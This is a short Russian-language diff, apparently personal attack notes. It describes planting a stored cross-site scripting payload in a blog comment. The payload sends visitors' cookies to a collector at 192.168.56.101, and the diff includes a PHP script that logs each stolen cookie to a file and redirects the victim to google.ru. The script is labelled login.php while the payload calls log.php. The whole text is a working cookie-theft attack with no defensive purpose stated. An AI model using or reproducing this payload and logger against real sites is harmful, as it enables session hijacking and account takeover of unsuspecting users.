@@ -1,0 +1,11 @@
+Оставляем коммент в блоге если все удачно на сервер 192.168.56.101 прилетят куки юзера
+<script>window.location = "http://192.168.56.101/log.php?c=" + document.cookie;</script>
+скрипт login.php:
+
+<?php 
+$logFile = "log.txt"; 
+$cookie = $_REQUEST["c"];
+$handle = fopen($logFile, "a"); 
+fwrite($handle, $cookie . "\n\n"); 
+fclose($handle);
+header("Location: http://www.google.ru/"); 
